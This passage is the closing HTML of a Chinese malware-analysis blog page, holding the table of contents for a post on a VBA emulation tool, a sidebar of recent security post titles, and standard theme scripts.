模块</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/08/maldoc-analysis-tool-oletools-instructions/"><img class="next-cover" src="https://image.zeronohacker.com/top_img/2020/09/08/media_ELBFukFX0AAZwGB.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">恶意文档分析工具 oletools 使用说明</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/11/26/evidence-of-vba-purging-found-in-malicious-documents/" title="使用 VBA Purging 的恶意文档"><img class="cover" src="https://image.zeronohacker.com/top_img/2020/11/26/malware-hacker.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-26</div><div class="title">使用 VBA Purging 的恶意文档</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://image.zeronohacker.com/header.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zeronohacker</div><div class="author-info__description">There is no absolutely safe system in the world!</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zeronohacker"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://twitter.com/zeronohacker" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a><a class="social-icon" href="mailto:zeronohacker@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://zeronohacker.github.io/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">2.</span> <span class="toc-text">免责声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97"><span class="toc-number">3.</span> <span class="toc-text">更新日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85"><span class="toc-number">4.</span> <span class="toc-text">下载和安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PyPy-%E5%AE%89%E8%A3%85-%E6%8E%A8%E8%8D%90"><span class="toc-number">4.1.</span> <span class="toc-text">使用 PyPy 安装 (推荐)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-CPython-%E5%AE%89%E8%A3%85"><span class="toc-number">4.2.</span> <span class="toc-text">使用 CPython 安装</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#oletools-%E7%89%88%E6%9C%AC"><span class="toc-number">5.1.</span> <span class="toc-text">oletools 版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8A%A0%E9%80%9F"><span class="toc-number">5.2.</span> <span class="toc-text">如何加速</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-%E6%8E%A5%E5%8F%A3"><span class="toc-number">6.</span> <span class="toc-text">API 接口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5-VBA-%E4%BB%BF%E7%9C%9F%E6%A8%A1%E6%8B%9F"><span class="toc-number">6.1.</span> <span class="toc-text">直接 VBA 仿真模拟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5-VBA-%E4%BB%A3%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text">检查 VBA 代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Blocks"><span class="toc-number">6.3.</span> <span class="toc-text">Code Blocks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%84%E4%BC%B0-Code-Blocks"><span class="toc-number">6.4.</span> <span class="toc-text">评估 Code Blocks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-CodeBlock-%E5%92%8C-VBA-Object-%E7%B1%BB%E5%9E%8B"><span class="toc-number">6.5.</span> <span class="toc-text">通用 CodeBlock 和 VBA_Object 类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E9%87%8A%E6%94%BE%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">6.6.</span> <span class="toc-text">提取释放的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%BF%E4%BB%A3%E5%87%BD%E6%95%B0"><span class="toc-number">6.7.</span> <span class="toc-text">替代函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B0%E5%BD%95%E8%A1%8C%E4%B8%BA"><span class="toc-number">6.8.</span> <span class="toc-text">记录行为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E9%AB%98%E9%80%9F%E5%BA%A6"><span class="toc-number">6.9.</span> <span class="toc-text">提高速度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%BB%E6%B7%B7%E6%B7%86"><span class="toc-number">6.10.</span> <span class="toc-text">去混淆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">7.</span> <span class="toc-text">结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/30/decoding-malious-powershell-activity-a-case-study/" title="从一个恶意活动中学习 PowerShell 解码"><img src="https://image.zeronohacker.com/top_img/2021/03/30/4-0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从一个恶意活动中学习 PowerShell 解码"/></a><div class="content"><a class="title" href="/2021/03/30/decoding-malious-powershell-activity-a-case-study/" title="从一个恶意活动中学习 PowerShell 解码">从一个恶意活动中学习 PowerShell 解码</a><time datetime="2021-03-30T13:50:59.000Z" title="发表于 2021-03-30 21:50:59">2021-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/22/how-to-use-vs2019-to-compile-assembly-and-win32-assembler-under-win10/" title="在 Win10 下如何用 VS2019 编译汇编及 win32 汇编程序"><img src="https://image.zeronohacker.com/top_img/2021/02/22/nzslbk8moxt_2a7a18ugpk4azxq.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="在 Win10 下如何用 VS2019 编译汇编及 win32 汇编程序"/></a><div class="content"><a class="title" href="/2021/02/22/how-to-use-vs2019-to-compile-assembly-and-win32-assembler-under-win10/" title="在 Win10 下如何用 VS2019 编译汇编及 win32 汇编程序">在 Win10 下如何用 VS2019 编译汇编及 win32 汇编程序</a><time datetime="2021-02-22T13:42:22.000Z" title="发表于 2021-02-22 21:42:22">2021-02-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/26/evidence-of-vba-purging-found-in-malicious-documents/" title="使用 VBA Purging 的恶意文档"><img src="https://image.zeronohacker.com/top_img/2020/11/26/malware-hacker.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="使用 VBA Purging 的恶意文档"/></a><div class="content"><a class="title" href="/2020/11/26/evidence-of-vba-purging-found-in-malicious-documents/" title="使用 VBA Purging 的恶意文档">使用 VBA Purging 的恶意文档</a><time datetime="2020-11-26T13:33:01.000Z" title="发表于 2020-11-26 21:33:01">2020-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/24/an-offensive-powershell-framework-nishang/" title="一款具有攻击性的 Powershell 框架 —— Nishang"><img src="https://image.zeronohacker.com/top_img/2020/11/24/Nishang-Framework.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一款具有攻击性的 Powershell 框架 —— Nishang"/></a><div class="content"><a class="title" href="/2020/11/24/an-offensive-powershell-framework-nishang/" title="一款具有攻击性的 Powershell 框架 —— Nishang">一款具有攻击性的 Powershell 框架 —— Nishang</a><time datetime="2020-11-24T13:20:45.000Z" title="发表于 2020-11-24 21:20:45">2020-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/23/customizing-c2-frameworks-for-av-evasion/" title="自定义 C2-Frameworks 来逃避 AV 检测"><img src="https://image.zeronohacker.com/top_img/2020/11/23/malware-img-66.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="自定义 C2-Frameworks 来逃避 AV 检测"/></a><div class="content"><a class="title" href="/2020/11/23/customizing-c2-frameworks-for-av-evasion/" title="自定义 C2-Frameworks 来逃避 AV 检测">自定义 C2-Frameworks 来逃避 AV 检测</a><time datetime="2020-11-23T12:45:19.000Z" title="发表于 2020-11-23 20:45:19">2020-11-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://image.zeronohacker.com/top_img/2020/09/09/media_ELBFukFX0AAZwGB.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By zeronohacker</div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="https://image.zeronohacker.com/icp.png"><span>赣ICP备20006890号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'en',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>